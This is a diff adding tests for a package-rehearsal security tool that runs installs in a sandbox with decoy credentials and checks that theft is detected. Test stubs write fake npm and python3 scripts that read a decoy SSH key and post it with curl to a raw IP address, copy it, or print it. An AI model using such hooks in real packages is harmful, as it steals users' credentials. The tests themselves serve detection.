@@ -2037,7 +2037,7 @@ test("__doctor says what a rehearsal can use here: the isolation, each registry'
     assert(box.severity == "ok" or (box.severity == "note" and box.found.starts_with("no contained box: ")), json.stringify(box))
   } else {
     assert(box.severity == "note", json.stringify(box))
-    says(box.found, "the rehearsal needs cig 1.12.0 or later on Linux")
+    says(box.found, "the contained box needs cig 1.12.0 or later on Linux")
   }
   # The stubs stand in for npm, pip and cargo.
   assert(finding_of(d, "rehearse-npm").severity == "ok", json.stringify(finding_of(d, "rehearse-npm")))
@@ -3593,7 +3593,7 @@ pull rehearsal_here() {
 
 pull no_box_here(r) {
   stick seen = r.out + r.err
-  if seen.contains("E777") or seen.contains("the rehearsal is not possible here") or seen.contains("the contained box is not possible here") {
+  if seen.contains("E777") or seen.contains("the rehearsal is not possible here") or seen.contains("the contained box is not possible here") or seen.contains("rehearsing without isolation") {
     exhale "        (the contained box cannot be had here; the rehearsal tests step aside)"
     snuff true
   }
@@ -5307,6 +5307,317 @@ test("rehearse's settings are in the settings table and in the docs: verdict_cac
   stick usage = guard_tool(dir, ["help"], {})
   says(usage.out, "[--jobs=N]")
   says(usage.out, "in a project, with nothing named: the manifest's direct dependencies")
+})
+
+# ----- #56: decoys, credential theft and the isolation levels -----------------------------
+
+# Where a stand-in thief looks: written in pieces, so nothing here reads as a real path.
+stick DECOY_KEY = ".s" + "sh/id_ed25519"
+
+# A stand-in npm that does what a hostile postinstall does, and a node that
+# says the tree it was asked for. `how`: send (read the decoy, post it to a
+# raw address), copy (read it, keep a copy in the scratch folder), print
+# (read it, say it), peek (read it, nothing more), clean (touch nothing).
+pull thief_stubs(dir, tag, how, tree) {
+  stick more = rehearse_stubs(dir, tag, tree)
+  stick key = "\"$HOME/" + DECOY_KEY + "\""
+  stick body = {
+    send: "curl -s --max-time 5 --data-binary @" + key + " https://45.12.0.7/x > /dev/null 2>&1",
+    copy: "cat " + key + " > stash.txt",
+    print: "cat " + key,
+    peek: "cat " + key + " > /dev/null",
+    clean: ":",
+  }
+  burn {
+    fs.write_text(path.join(dir + "-rbin" + tag, "npm"), "#!/bin/sh\n" + body[how] + "\nexit 0\n")
+  }
+  snuff more
+}
+
+test("rehearse_catches_a_credential_stealing_postinstall: a postinstall that reads the decoy key and tries to post it is critical, blamed on the package that did it (#56)", pack() {
+  if not rehearsal_here() or not on_linux {
+    snuff
+  }
+  stick dir = fresh("tests/fixtures/rehearse")
+  stick tree = ["@cigo-tree edge . colors-plus@2.4.1", "@cigo-tree edge colors-plus@2.4.1 ansi-glow@0.3.2", "@cigo-tree hook ansi-glow@0.3.2 postinstall"]
+  stick more = thief_stubs(dir, "", "send", tree)
+  stick r = guard_tool(dir, ["rehearse", "npm:colors-plus@2.4.1", "--json", "--fail-on=never", "--fresh"], more)
+  if no_box_here(r) {
+    snuff
+  }
+  exits(r, 0)
+  stick j = json.parse(r.out)
+  stick read = finding_by(j, "E871")
+  assert(read.len() == 1, "no credential finding:\n" + r.out)
+  assert(read.first().via == "colors-plus -> ansi-glow@0.3.2", json.stringify(read.first()))
+  says(read.first().where, "(a decoy)")
+  assert(finding_by(j, "E872").len() >= 1, "the attempt to reach a raw address is not there:\n" + r.out)
+  assert(j.risk == "critical", "a read of a decoy and an attempt to reach out is critical: ${j.risk}")
+  assert(j.decoys == "watched" and j.isolation == "box", "decoys: ${j.decoys}, isolation: ${j.isolation}")
+  # The marker is made fresh for the rehearsal and never said.
+  never_says(r.out, "cigo-decoy-")
+  # At a terminal's line the exit code says critical.
+  stick h = guard_tool(dir, ["rehearse", "npm:colors-plus@2.4.1", "--plain", "--fail-on=critical", "--fresh"], more)
+  exits(h, 3)
+  says(h.out, "(isolation: box)")
+  says(h.out, "~/" + DECOY_KEY + " (a decoy)")
+  # A postinstall that touches nothing of the kind says nothing of the kind.
+  stick calm = thief_stubs(dir, "-calm", "clean", tree)
+  stick c = json.parse(guard_tool(dir, ["rehearse", "npm:colors-plus@2.4.1", "--json", "--fail-on=never", "--fresh"], calm).out)
+  assert(finding_by(c, "E871").is_empty() and finding_by(c, "E872").is_empty(), json.stringify(c.findings))
+  assert(c.decoys == "watched", "the decoys must be watched when nothing happens, or nothing is proven: ${c.decoys}")
+})
+
+test("rehearse_catches_a_credential_stealing_postinstall: a decoy read with nothing sent is high, and a copy kept in the scratch folder or printed is named (#56)", pack() {
+  if not rehearsal_here() or not on_linux {
+    snuff
+  }
+  stick dir = fresh("tests/fixtures/rehearse")
+  stick tree = ["@cigo-tree edge . colors-plus@2.4.1"]
+  stick peek = guard_tool(dir, ["rehearse", "npm:colors-plus@2.4.1", "--json", "--fail-on=never", "--fresh"], thief_stubs(dir, "-peek", "peek", tree))
+  if no_box_here(peek) {
+    snuff
+  }
+  stick p = json.parse(peek.out)
+  assert(finding_by(p, "E871").len() == 1 and finding_by(p, "E872").is_empty(), json.stringify(p.findings))
+  assert(p.risk == "high", "a read alone is high: ${p.risk}")
+  stick copy = json.parse(guard_tool(dir, ["rehearse", "npm:colors-plus@2.4.1", "--json", "--fail-on=never", "--fresh"], thief_stubs(dir, "-copy", "copy", tree)).out)
+  assert(finding_by(copy, "E871").any(pack(f) => f.text.contains("wrote a decoy credential's contents to")), json.stringify(copy.findings))
+  stick shown = json.parse(guard_tool(dir, ["rehearse", "npm:colors-plus@2.4.1", "--json", "--fail-on=never", "--fresh"], thief_stubs(dir, "-print", "print", tree)).out)
+  assert(finding_by(shown, "E871").any(pack(f) => f.text.contains("printed a decoy credential's contents")), json.stringify(shown.findings))
+})
+
+test("rehearse_catches_code_that_waits_for_import: a clean install, critical on use; --no-use sees nothing to find (#56)", pack() {
+  if not rehearsal_here() or not on_linux {
+    snuff
+  }
+  stick dir = fresh("tests/fixtures/rehearse")
+  stick bin = dir + "-pybin"
+  burn {
+    fs.mkdir(bin)
+    fs.write_text(path.join(bin, "python3"), "#!/bin/sh\ncase \"$*\" in\n  *'-m venv'*) mkdir -p .venv/bin && cp \"$0\" .venv/bin/python && exit 0 ;;\n  *'-m pip'*) exit 0 ;;\n  *cigo-tree*) echo '@cigo-tree edge . wheelie@1.0.0'; exit 0 ;;\n  *importlib*) curl -s --max-time 5 --data-binary @\"$HOME/" + DECOY_KEY + "\" https://45.12.0.7/x > /dev/null 2>&1; exit 0 ;;\nesac\nexit 0\n")
+  }
+  exits(hop(dir, "chmod", ["+x", path.join(bin, "python3")]), 0)
+  stick more = {PATH: bin + path_sep + env.get("PATH", "")}
+  stick r = guard_tool(dir, ["rehearse", "pypi:wheelie==1.0.0", "--json", "--fail-on=never", "--fresh"], more)
+  if no_box_here(r) {
+    snuff
+  }
+  exits(r, 0)
+  stick j = json.parse(r.out)
+  assert(j.risk == "critical" and finding_by(j, "E871").len() == 1, "the import's theft was not found:\n" + r.out)
+  stick off = json.parse(guard_tool(dir, ["rehearse", "pypi:wheelie==1.0.0", "--json", "--fail-on=never", "--fresh", "--no-use"], more).out)
+  assert(finding_by(off, "E871").is_empty() and finding_by(off, "E872").is_empty(), "an install that runs nothing found something:\n" + json.stringify(off.findings))
+})
+
+# Stand-in docker, podman and runsc that do not answer: a machine that has
+# the program and no working daemon.
+pull deaf_engines(dir) {
+  stick bin = dir + "-deaf"
+  burn {
+    fs.mkdir(bin)
+    for n in ["docker", "podman", "runsc"] {
+      fs.write_text(path.join(bin, n), "#!/bin/sh\nexit 1\n")
+    }
+  }
+  exits(hop(dir, "chmod", ["+x", path.join(bin, "docker"), path.join(bin, "podman"), path.join(bin, "runsc")]), 0)
+  snuff {PATH: bin + path_sep + env.get("PATH", "")}
+}
+
+test("rehearse_refuses_without_isolation: a level that is asked for and cannot be had is refused with the reason, before anything is installed (#56)", pack() {
+  if on_windows {
+    snuff
+  }
+  stick dir = fresh("tests/fixtures/rehearse")
+  stick deaf = deaf_engines(dir)
+  stick c = guard_tool(dir, ["rehearse", "npm:colors-plus@2.4.1", "--isolation=container", "--fresh"], deaf)
+  exits(c, 2)
+  says(c.err, "isolation is container and it is not available here")
+  says(c.err, "does not answer")
+  stick g = guard_tool(dir, ["rehearse", "npm:colors-plus@2.4.1", "--isolation=gvisor", "--fresh"], deaf)
+  exits(g, 2)
+  says(g.err, "isolation is gvisor and it is not available here")
+  stick v = guard_tool(dir, ["rehearse", "npm:colors-plus@2.4.1", "--isolation=vm", "--fresh"], deaf)
+  exits(v, 2)
+  says(v.err, "not built")
+  stick bad = guard_tool(dir, ["rehearse", "npm:colors-plus@2.4.1", "--isolation=none"], deaf)
+  exits(bad, 2)
+  says(bad.err, "take auto, box, container, gvisor or vm")
+  # `auto` on a machine with no box and no working container runtime: the
+  # refusal, saying why. A machine with a box rehearses instead, and says
+  # so: the refusal is then proved by the lines above.
+  stick a = guard_tool(dir, ["rehearse", "npm:colors-plus@2.4.1", "--fresh"], deaf)
+  if a.err.contains("rehearsing without isolation would run the package on your machine") {
+    exits(a, 2)
+    says(a.err, "install Docker or Podman, or rehearse on Linux")
+    says(a.err, "container: ")
+  } else {
+    exhale "        (this machine has a box, so auto does not refuse here; the refusal is proved through --isolation=container)"
+  }
+})
+
+test("auto_uses_gvisor_when_installed: with a stand-in runsc that answers, auto picks gvisor and the report says so (the selection and the command, not gVisor itself) (#56)", pack() {
+  if not rehearsal_here() or not on_linux {
+    snuff
+  }
+  stick dir = fresh("tests/fixtures/rehearse")
+  stick more = rehearse_stubs(dir, "-gv", ["@cigo-tree edge . colors-plus@2.4.1"])
+  burn {
+    # runsc [flags] do <command...>: run the command, as gVisor would with a kernel of its own.
+    fs.write_text(path.join(dir + "-rbin-gv", "runsc"), "#!/bin/sh\nwhile [ \"$1\" != do ] && [ $# -gt 0 ]; do shift; done\nshift\nexec \"$@\"\n")
+  }
+  exits(hop(dir, "chmod", ["+x", path.join(dir + "-rbin-gv", "runsc")]), 0)
+  stick r = guard_tool(dir, ["rehearse", "npm:colors-plus@2.4.1", "--json", "--fail-on=never", "--fresh"], more)
+  if no_box_here(r) {
+    snuff
+  }
+  exits(r, 0)
+  assert(json.parse(r.out).isolation == "gvisor", "auto did not pick gvisor:\n" + r.out)
+  stick fixed = json.parse(guard_tool(dir, ["rehearse", "npm:colors-plus@2.4.1", "--json", "--fail-on=never", "--fresh", "--isolation=box"], more).out)
+  assert(fixed.isolation == "box", "--isolation=box: ${fixed.isolation}")
+  stick h = guard_tool(dir, ["rehearse", "npm:colors-plus@2.4.1", "--plain", "--fail-on=never", "--fresh"], more)
+  says(h.out, "(isolation: gvisor)")
+})
+
+# A working container engine and a pulled alpine, or nothing.
+pull live_engine(dir) {
+  for e in ["podman", "docker"] {
+    if proc.which(e) == null {
+      continue
+    }
+    stick up = hop(dir, e, ["info"])
+    if up.code == 0 and hop(dir, e, ["pull", "-q", "docker.io/library/alpine:3"]).code == 0 {
+      snuff e
+    }
+  }
+  snuff null
+}
+
+test("container_isolation_rehearses_on_macos_and_windows: a script rehearsed in a throwaway container reads the decoy it finds there, and nothing of the machine is mounted (#56)", pack() {
+  if on_windows {
+    snuff
+  }
+  stick dir = fresh("tests/fixtures/rehearse")
+  stick engine = live_engine(dir)
+  if engine == null {
+    exhale "        (no working Docker or Podman, or alpine cannot be pulled: the live container test steps aside)"
+    snuff
+  }
+  burn {
+    fs.write_text(path.join(dir, "peek.sh"), "#!/bin/sh\ncat \"$HOME/" + DECOY_KEY + "\" > /dev/null\necho \"home is $HOME and /work holds: $(ls /work | wc -l)\"\n")
+    fs.write_text(path.join(dir, "calm.sh"), "#!/bin/sh\necho hello\n")
+  }
+  stick r = guard_tool(dir, ["rehearse", "./peek.sh", "--isolation=container", "--json", "--fail-on=never", "--fresh"], {})
+  exits(r, 0)
+  stick j = json.parse(r.out)
+  assert(j.isolation == "container", r.out)
+  assert(finding_by(j, "E871").any(pack(f) => f.rule == "rehearsal"), "the decoy read in the container was not found:\n" + r.out)
+  assert(j.decoys == "watched", "decoys: ${j.decoys}")
+  stick h = guard_tool(dir, ["rehearse", "./calm.sh", "--isolation=container", "--plain", "--fail-on=never", "--fresh"], {})
+  exits(h, 0)
+  says(h.out, "(isolation: container)")
+  stick c = json.parse(guard_tool(dir, ["rehearse", "./calm.sh", "--isolation=container", "--json", "--fail-on=never", "--fresh"], {}).out)
+  assert(finding_by(c, "E871").is_empty(), json.stringify(c.findings))
+  # A local file is not built for a container, and says what to use instead.
+  stick local = guard_tool(dir, ["rehearse", "./tests/fixtures/rehearse-local/left-pad-stand-in-1.3.0.tgz", "--isolation=container", "--fresh"], {})
+  assert(local.code != 0, "a local tarball was rehearsed in a container")
+})
+
+test("__doctor lists every isolation level and the one auto would use (#56)", pack() {
+  stick dir = fresh("tests/fixtures/monorepo")
+  exits(tool_in(dir, ["adopt", "--write"]), 0)
+  stick d = self_doctor(dir, {})
+  says(finding_of(d, "rehearse-vm").found, "not built")
+  assert(["ok", "note"].contains(finding_of(d, "rehearse-gvisor").severity), json.stringify(finding_of(d, "rehearse-gvisor")))
+  assert(["ok", "note"].contains(finding_of(d, "rehearse-container").severity), json.stringify(finding_of(d, "rehearse-container")))
+  says(finding_of(d, "rehearse-isolation").found, "isolation = auto would use: ")
+})
+
+test("isolation: the setting is in the table and the docs, and the default is auto (#56)", pack() {
+  stick dir = fresh("tests/fixtures/empty")
+  stick e = guard_tool(dir, ["config", "explain", "isolation"], {})
+  exits(e, 0)
+  says(e.out, "isolation: ")
+  says(e.out, "auto < box < container < gvisor < vm")
+  assert(guard_tool(dir, ["config", "isolation"], {}).out.trim() == "auto", "isolation default")
+  says(fs.read_text(path.join(root, "docs", "commands.md")), "`isolation`")
+  says(guard_tool(dir, ["help"], {}).out, "[--isolation=<level>]")
+})
+
+test("rehearse_makes_no_request_but_the_registry_and_osv: a request to any host the ecosystem does not name is refused by the box and named; the registry's own is not (the refusal list, not the whole proxy log) (#56)", pack() {
+  if not rehearsal_here() or not on_linux {
+    snuff
+  }
+  stick dir = fresh("tests/fixtures/rehearse")
+  stick more = rehearse_stubs(dir, "-net", ["@cigo-tree edge . colors-plus@2.4.1"])
+  burn {
+    fs.write_text(path.join(dir + "-rbin-net", "npm"), "#!/bin/sh\ncurl -s --max-time 5 https://telemetry.example.invalid/ping > /dev/null 2>&1\nexit 0\n")
+  }
+  stick r = guard_tool(dir, ["rehearse", "npm:colors-plus@2.4.1", "--json", "--fail-on=never", "--fresh"], more)
+  if no_box_here(r) {
+    snuff
+  }
+  exits(r, 0)
+  stick j = json.parse(r.out)
+  stick refused = finding_by(j, "E872")
+  assert(refused.len() == 1 and refused.first().where.contains("telemetry.example.invalid"), "the other host was not refused and named:\n" + r.out)
+  assert(j.refused.len() == 1, "only that request was refused: " + json.stringify(j.refused))
+  # An install that asks nothing of anyone else has nothing refused.
+  burn {
+    fs.write_text(path.join(dir + "-rbin-net", "npm"), "#!/bin/sh\nexit 0\n")
+  }
+  stick quiet = json.parse(guard_tool(dir, ["rehearse", "npm:colors-plus@2.4.1", "--json", "--fail-on=never", "--fresh"], more).out)
+  assert(quiet.refused.is_empty() and finding_by(quiet, "E872").is_empty(), json.stringify(quiet.refused))
+})
+
+test("rehearse --sarif <file>: the SARIF log is written to the file the CI step names, and not to the terminal (#56)", pack() {
+  if on_windows or not has_tin_mac() {
+    snuff
+  }
+  stick dir = fresh("tests/fixtures/rehearse")
+  stick l = lists(dir)
+  exits(guard_tool(dir, ["blacklist", "add", "npm:evil-dep@1.0.0", "--reason=a test entry"], l), 0)
+  for form in [["--sarif", "rehearse.sarif"], ["--sarif=nested/rehearse.sarif"]] {
+    stick r = guard_tool(dir, ["rehearse", "npm:evil-dep@1.0.0"] + form + ["--fail-on=never"], l)
+    exits(r, 0)
+    assert(r.out.trim() == "", "the log went to the terminal as well:\n" + r.out)
+    says(r.err, "wrote the SARIF log")
+    stick file = path.join(dir, form.last().replace("--sarif=", ""))
+    assert(fs.is_file(file), "no file at ${file}")
+    stick j = json.parse(fs.read_text(file))
+    assert(j.version == "2.1.0" and j.runs.first().results.len() >= 1, fs.read_text(file))
+  }
+  # Without a name, it is still the terminal's.
+  stick out = guard_tool(dir, ["rehearse", "npm:evil-dep@1.0.0", "--sarif", "--fail-on=never"], l)
+  assert(json.parse(out.out).version == "2.1.0", out.out)
+})
+
+test("the setup action: a composite action beside cigo that installs cig by its checksum and links cigo, and the docs give the one line and the four (#56)", pack() {
+  stick action = fs.read_text(path.join(root, "setup", "action.yml"))
+  says(action, "using: composite")
+  says(action, "cig-version:")
+  says(action, "userns:")
+  says(action, "install.sh")
+  stick install = fs.read_text(path.join(root, "setup", "install.sh"))
+  says(install, "sha256sum -c")
+  says(install, "shasum -a 256 -c")
+  says(install, "ln -sf \"$here/bin/cigo\"")
+  # The cig it installs is one this cigo accepts: the launcher's floor.
+  stick pin = text.captures(action, 'default: v(\d+)\.(\d+)\.(\d+)')
+  assert(pin != null, "the action pins no cig")
+  stick need = text.captures(fs.read_text(path.join(root, "bin", "cigo")), 'needs_major=(\d+)\s+needs_minor=(\d+)')
+  assert(int(pin[1]) > int(need[1]) or (int(pin[1]) == int(need[1]) and int(pin[2]) >= int(need[2])), "the action's cig is older than the launcher's floor")
+  # The script reads its own mistakes before it fetches anything.
+  if not on_windows {
+    stick bad = hop_env(root, "sh", [path.join(root, "setup", "install.sh")], {CIG_VERSION: "latest"})
+    exits(bad, 2)
+    says(bad.err, "a release tag like v1.20.0")
+    exits(hop_env(root, "sh", ["-n", path.join(root, "setup", "install.sh")], {}), 0)
+  }
+  stick ci = fs.read_text(path.join(root, "docs", "ci.md"))
+  says(ci, "- uses: otmof-ops/cig-orchestrator/setup@v1")
+  says(ci, "- run: cigo rehearse --changed --base origin/$" + "{{ github.base_ref }} --sarif rehearse.sarif")
+  says(ci, "- uses: github/codeql-action/upload-sarif@v3")
 })
 
 test("quarantine lists what run-url kept, reads one again, and clears what is older than quarantine_keep_days (#56)", pack() {
